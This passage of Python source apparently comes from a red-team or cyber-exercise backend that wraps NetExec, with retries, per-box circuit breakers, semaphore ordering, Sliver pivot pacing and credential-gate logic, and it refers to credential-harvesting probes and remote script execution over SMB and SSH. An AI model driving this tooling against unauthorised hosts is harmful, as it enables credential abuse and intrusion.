            non_empty = [s for s in stripped if s.strip()]
            # Prefer exec-failure lines as the error summary when present
            exec_err_lines = [s for s in non_empty if _EXEC_FAILURE_RE.search(s)]
            error = (exec_err_lines[-1] if exec_err_lines
                     else non_empty[-1] if non_empty
                     else "No output from nxc")

        return NXCResult(
            success=success,
            output=output,
            host=host,
            protocol=protocol,
            error=error,
            raw=stdout,
        )

    async def _run(
        self,
        args: list[str],
        host: str,
        protocol: str,
        env_extra: dict[str, str] | None = None,
        *,
        timeout_override: int | None = None,
        box_ip: str | None = None,
        max_retries_override: int | None = None,
    ) -> NXCResult:
        """Core subprocess runner — all public methods delegate here.

        `env_extra` merges into the subprocess env after the inherited
        `os.environ` and `NXC_PATH` — used by ccache auth to set
        `KRB5CCNAME` on the NXC subprocess only.
        """
        from fastapi_backend.core.config import config  # cycle-break
        from fastapi_backend.core.nxc_health import get_tracker  # cycle-break
        from fastapi_backend.netexec import nxc_audit  # cycle-break
        from fastapi_backend.netexec.nxc_semaphore import (  # cycle-break
            box_cooldown_remaining,
            note_box_result,
        )

        # Per-box circuit-breaker: a box that keeps NETBIOS-timing-out is saturated
        # or wedged; hammering it with concurrent ops + retries just prolongs the
        # wedge. If it tripped the breaker, wait out its cooldown BEFORE acquiring
        # any semaphore slot (so the wait holds no slot) — giving it time to recover.
        # Key on ``box_ip or host`` so pivot-routed calls (dial 127.0.0.1:<port>)
        # get INDEPENDENT breaker state per target box instead of piling every
        # pivot target into one 127.0.0.1 bucket. See
        # docs/PLAN_cred_loop_cooldown_defer.md.
        # Pace connections to Sliver pivot portfwds (127.0.0.1:<port>). Sliver's
        # server-side `delayBeforeClose = 10s` keeps a portfwd tunnel half-closed
        # for ~10s after client FIN; a new NXC TCP conn within that window races
        # with the still-closing state → paramiko errors on the SSH banner
        # ("Unknown SSH Version" / "Internal Paramiko error reading SSH protocol
        # banner"). Isolated repro measured 42.5% failure at 5s spacing. See
        # project_pivot_portfwd_race_definitive + scripts/diagnostic/
        # pivot_tunnel_repro_v2.py. The pacer waits (releases the event loop)
        # OUTSIDE the semaphore path — no permit held during the sleep.
        if host in ("127.0.0.1", "localhost", "::1"):
            from fastapi_backend.netexec.nxc_semaphore import (  # cycle-break
                pivot_portfwd_pace_wait,
            )
            _port = None
            for i, a in enumerate(args):
                if a == "--port" and i + 1 < len(args):
                    try:
                        _port = int(args[i + 1])
                    except ValueError:
                        _port = None
                    break
            if _port is not None:
                _wait = pivot_portfwd_pace_wait(_port)
                if _wait > 0:
                    self.logger.debug(
                        "nxc pivot pacer: waiting %.2fs on %s:%d",
                        _wait, host, _port,
                    )
                    await asyncio.sleep(_wait)

        breaker_key = box_ip or host
        cooldown = box_cooldown_remaining(breaker_key)
        if cooldown > 0:
            self.logger.warning(
                "nxc %s %s in cooldown (saturated: repeated NETBIOS timeouts) — "
                "waiting %.1fs before next op", protocol, breaker_key, cooldown,
            )
            await asyncio.sleep(cooldown)

        # Audit entry captured BEFORE the first attempt so the logged span includes
        # queue wait + any retry backoff (diagnostic: NXC_AUDIT_LOG; no-op unset).
        _audit_entry = time.time()
        # put_file has its OWN transient retry (put_file_cred) + WinRM/SSH
        # escalation — don't double-retry it here (2×5 attempts).
        is_putfile = ("--put-file" in args) or ("--get-file" in args)
        # Callers may cap retries to zero for validation-loop probes: those
        # loops already retry every cycle, so retrying INSIDE the wrapper on a
        # fragile box just amplifies the flood by ~N per probe. See
        # cred_harvester's _probe_nthash / _probe_domain_nthashes_dc_direct /
        # _probe_team_ticket callers.
        if max_retries_override is not None:
            max_retries = max(0, max_retries_override)
        elif is_putfile:
            max_retries = 0
        else:
            max_retries = max(0, config.NXC_EXEC_MAX_RETRIES)

        result = await self._run_once(args, host, protocol, env_extra, timeout_override=timeout_override)
        attempt = 0
        # Retry only a TRANSIENT NETBIOS-class failure — a momentarily-congested
        # box, not a deterministic error. Each _run_once re-acquires the per-box
        # semaphore (so a retry never adds concurrent load to the same box), and
        # the backoff sleep runs with the slot RELEASED (so it doesn't block the
        # box) — bounded, back-off'd, per-box-serialized. No retry-storm.
        while (
            attempt < max_retries
            and not result.success
            and _TRANSIENT_EXEC_RE.search(f"{result.raw or ''} {result.error or ''}")
        ):
            backoff = config.NXC_EXEC_RETRY_BACKOFF_SEC * (2**attempt)
            self.logger.warning(
                "nxc %s %s transient NETBIOS timeout — retry %d/%d after %.1fs",
                protocol, host, attempt + 1, max_retries, backoff,
            )
            await asyncio.sleep(backoff)
            result = await self._run_once(args, host, protocol, env_extra, timeout_override=timeout_override)
            attempt += 1

        # Feed the per-box circuit-breaker. `transient` = a NETBIOS/connection-class
        # failure (the wedge signal); a deterministic failure (auth, bad path) must
        # not trip a cooldown that would not help it.
        _transient = (not result.success) and bool(
            _TRANSIENT_EXEC_RE.search(f"{result.raw or ''} {result.error or ''}")
        )
        note_box_result(breaker_key, result.success, transient=_transient)
        get_tracker().record(breaker_key, result.success)
        nxc_audit.record(
            args=args, host=breaker_key, protocol=protocol, start_ts=_audit_entry,
            success=result.success, raw=result.raw or "", error=result.error or "",
        )
        return result

    async def _run_once(
        self,
        args: list[str],
        host: str,
        protocol: str,
        env_extra: dict[str, str] | None = None,
        *,
        timeout_override: int | None = None,
    ) -> NXCResult:
        """Run one nxc attempt behind the credential warm-gate.

        The gate (``netexec/nxc_credwarm.py``) serializes only the FIRST nxc call
        per ``(protocol, username)`` per workspace. nxc's own ``add_credential``
        has no unique constraint on the credential identity, so two concurrent
        first-calls both INSERT — and from then on the function returns a *list*
        instead of an int id, which its ssh caller binds straight into SQL
        (``ProgrammingError: type 'list' is not supported``). nxc then dies
        before running our command, and the workspace stays poisoned. Once the
        row exists every later call takes the single-row path, so the gate costs
        one ``os.path.exists`` per spawn in steady state.

        Gate is acquired OUTSIDE the NXC semaphores deliberately: a waiter must
        not sit on a per-box + global permit while it blocks, or a burst of
        same-identity first-calls would pin the whole global pool.
        """
        from fastapi_backend.netexec import nxc_credwarm  # cycle-break

        username = nxc_credwarm.username_from_args(args)
        async with nxc_credwarm.warm_gate(self.nxc_path, protocol, username):
            return await self._spawn_once(args, host, protocol, env_extra, timeout_override=timeout_override)

    async def _spawn_once(
        self,
        args: list[str],
        host: str,
        protocol: str,
        env_extra: dict[str, str] | None = None,
        *,
        timeout_override: int | None = None,
    ) -> NXCResult:
        """Acquire semaphores, spawn nxc, parse, release.

        Retries + audit/health tracking live in ``_run``. Each attempt independently
        acquires the per-box semaphore, so a retry respects
        ``NXC_MAX_CONCURRENT_PER_BOX`` and never piles concurrent load on the box.
        """
        from fastapi_backend.netexec.nxc_semaphore import (  # cycle-break
            get_acquire_executor,
            get_global_semaphore,
            get_per_box_semaphore,
        )
        loop = asyncio.get_running_loop()
        # Lock ordering: acquire the scarce PER-BOX semaphore FIRST, then the
        # abundant GLOBAL one. The reverse order (global-then-per-box) lets a
        # task pin a global slot while it blocks on the per-box semaphore, so a
        # few hot boxes (check + SA + cred-reval overlapping) exhaust the whole
        # 40-slot global pool with blocked tasks and stall NXC for EVERY box —
        # observed in soak 2026-06-18 as 100% IOC-check failure + 620s
        # BoxIOCTask hard-timeouts across all 50 boxes (incl. direct-access
        # firewalls). With per-box-first the global pool is held only by tasks
        # actually running nxc (which finish in seconds), so it never starves;
        # contention stays confined to per-box. A single consistent acquire
        # order across all callers also precludes lock-ordering deadlock.
        per_box_sem = get_per_box_semaphore(host)
        # Acquire BOTH semaphores inside a SINGLE executor task (per-box first,
        # then global) — NOT two separate run_in_executor submissions. Two
        # submissions let a coroutine hold a per-box permit while it waits on a
        # SECOND pool thread for the global acquire. Once the acquire pool
        # (NXC_MAX_CONCURRENT + 20 threads) fills with coroutines blocked on the
        # first-stage per-box acquire, no thread is free for any second-stage
        # global acquire, so per-box-permit holders can never advance to spawn
        # nxc and release — a thread-pool starvation deadlock. Observed
        # 2026-06-20: a single-team (5-box) deploy-all concentrated the whole IOC
        # catalogue onto 5 IPs, wedging 82/86 worker threads on futex waits with
        # zero nxc subprocesses spawned. One submission == one pool thread per
        # op, held only until BOTH permits are in hand, so holders always make
        # progress and waiters drain. Per-box-first ordering (below) is retained.
        def _acquire_both() -> None:
            per_box_sem.acquire()
            get_global_semaphore().acquire()

        await loop.run_in_executor(get_acquire_executor(), _acquire_both)
        _effective_timeout = timeout_override if timeout_override is not None else self.default_timeout
        try:
            env = {**os.environ, "NXC_PATH": self.nxc_path}
            if env_extra:
                env.update(env_extra)
            # docs/PLAN_soak_backend_perf.md §3.3: spawn NXC via subprocess.Popen
            # on a worker thread, NOT via asyncio.create_subprocess_exec on the
            # event loop. Proven 2026-08-30 by C3R_LOOP_HEARTBEAT stack samples:
            # the event loop stalled 944-2060ms inside logging._afterFork after
            # fork() in asyncio.subprocess. The stall runs synchronously in the
            # calling thread post-fork (weakref sweep across every logging
            # handler under the RSS). Off-loading fork+wait to a thread keeps
            # _afterFork off the loop; the loop stays free to accept TLS
            # handshakes and serve /admin/status. See wiki/subsystems.md.
            stdout_bytes, returncode = await asyncio.to_thread(
                _spawn_nxc_sync, args, env, _effective_timeout,
            )
            result = self._parse_output(
                stdout_bytes.decode("utf-8", errors="replace"), host, protocol
            )
            result.returncode = returncode
            if not result.success:
                # Exit code + full raw bytes aren't surfaced anywhere else — callers
                # only get `error` (last non-empty line, or the generic "No output
                # from nxc" when stdout was blank). Log both here, once, so every
                # caller's failures are diagnosable without re-running by hand.
                self.logger.warning(
                    "nxc failed for %s %s (exit %s): %s",
                    protocol, host, result.returncode, result.raw[:2000] or "<empty output>",
                )
        except _NXCSubprocessTimeoutError:
            self.logger.warning(
                f"nxc timed out after {_effective_timeout}s: {host} {args}"
            )
            result = NXCResult(
                success=False,
                output="",
                host=host,
                protocol=protocol,
                error=f"Timeout after {_effective_timeout}s",
                raw="",
            )
        except asyncio.CancelledError:
            # Operator-initiated task kill (POST /c2/tasks/{id}/kill) raises this
            # through asyncio.to_thread — the worker thread's Popen keeps its own
            # kill-on-timeout in _spawn_nxc_sync, so nothing leaks here.
            raise
        except Exception as e:
            self.logger.error(f"nxc subprocess error: {e}")
            result = NXCResult(
                success=False,
                output="",
                host=host,
                protocol=protocol,
                error=str(e),
                raw="",
            )
        finally:
            # Release in reverse acquire order: global first, then per-box.
            get_global_semaphore().release()
            per_box_sem.release()
        return result


# ---------------------------------------------------------------------------
# Module-level helpers used by check_runner and orchestrator
# ---------------------------------------------------------------------------


def protocol_for_box(box_os: str) -> tuple[str, bool]:
    """Return (nxc_protocol, use_powershell) for a given box OS.

    Windows → ("smb", True)  — scripts run via PowerShell (-X flag)
    Linux   → ("ssh", False) — scripts run via shell (-x flag)
    """
    os_lower = box_os.lower()
    if "windows" in os_lower or "win" in os_lower:
        return "smb", True
    return "ssh", False


def remote_temp_path(box_os: str, filename: str) -> str:
    """Return a suitable remote temp path for the given OS and filename."""
    if "windows" in box_os.lower() or "win" in box_os.lower():
        return f"C:\\Windows\\Temp\\{filename}"
    return f"/tmp/{filename}"


# build_inline_command moved to netexec.script_wrapper.  Re-exported here for
# backwards-compatible import in callers (check_runner, ioc_deploy, etc.).
# Deprecated — new code should import from netexec.script_wrapper directly.
from fastapi_backend.netexec.script_wrapper import (  # noqa: E402  # legacy re-export
    build_inline_command,  # noqa: F401  # re-exported for backwards-compat
)
